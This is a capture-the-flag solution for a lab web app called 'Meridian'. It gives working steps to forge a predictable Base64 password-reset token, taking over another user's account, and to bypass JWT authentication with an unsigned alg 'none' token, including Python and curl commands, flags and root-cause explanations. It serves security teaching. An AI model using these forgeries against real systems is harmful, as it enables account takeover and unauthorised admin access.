# Solution — Meridian

---

## Objective 1 — Predictable password reset token

Log in as `alice` / `alice123` first, just to get a feel for the app, then
log out and go to **Forgot password**. Request a reset for your own
account:

```
username: alice
```

Mail delivery is disabled in the lab, so the link comes straight back:

```
/reset-password?token=YWxpY2U6NDczNTEz
```

That token looks random, but it's just Base64:

```bash
echo YWxpY2U6NDczNTEz | base64 -d
# alice:473513
```

`alice:473513` — your username and a number, in plaintext, once decoded.
The number is `Date.now()` divided down to an hour bucket — meaning
anyone can compute it themselves without ever seeing your token, just by
knowing the current time.

Request a reset for `bob` instead — you'll never see *his* real token
(no email access), but you don't need to: build your own using the same
hour bucket you just observed:

```bash
python3 -c "import base64; print(base64.b64encode(b'bob:473513').decode())"
# Ym9iOjQ3MzUxMw==
```

Submit that at `/reset-password` with a new password of your choosing.
The app accepts it — the token "proves" you're Bob because nothing about
it actually does. Log in as `bob` with your new password and his
dashboard shows:

```
0xBugLabs{pr3d1ct4bl3_r3s3t_t0k3n_4cc0unt_t4k30v3r}
```

**Root cause:** the reset token encodes *who* the reset is for and
*roughly when* it was issued — both guessable — instead of a large random
value the server generated and remembers. Base64 is encoding, not
encryption; anything encoded that way is public information the moment an
attacker has one example of it.

---

## Objective 2 — JWT `alg: none`

Sessions here are JWTs stored in a `token` cookie — inspect one after
logging in (`jwt.io` or just decode the middle segment yourself, same
Base64 idea as above). The payload is plain: `{"userId":1,"role":"customer"}`.

You could try to forge a `role: "admin"` token the "hard" way — guess the
signing secret — but check the header segment first:

```json
{"alg":"HS256","typ":"JWT"}
```

`jwt.js` on the server accepts whatever `alg` the token *claims*, and if
that value is `"none"`, it skips signature verification entirely. Build a
token with that header, no signature needed:

```python
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"userId": 3, "role": "admin"}).encode())
print(f"{header}.{payload}.")   # trailing dot: empty signature segment
```

Set that as your `token` cookie and visit `/admin`:

```bash
curl -s --cookie "token=<forged token>" http://localhost:8083/admin
```

```
0xBugLabs{jwt_4lg_n0n3_4uth_byp4ss}
```

**Root cause:** `jwt.js`'s `verify()` branches on the algorithm named
*inside the token itself* instead of hardcoding the one algorithm the
server actually issues. Trusting attacker-controlled input to decide how
that same input gets validated is the root of this entire bug class — it's
shown up as a real CVE across several JWT libraries' early versions, not
just as a theoretical example.
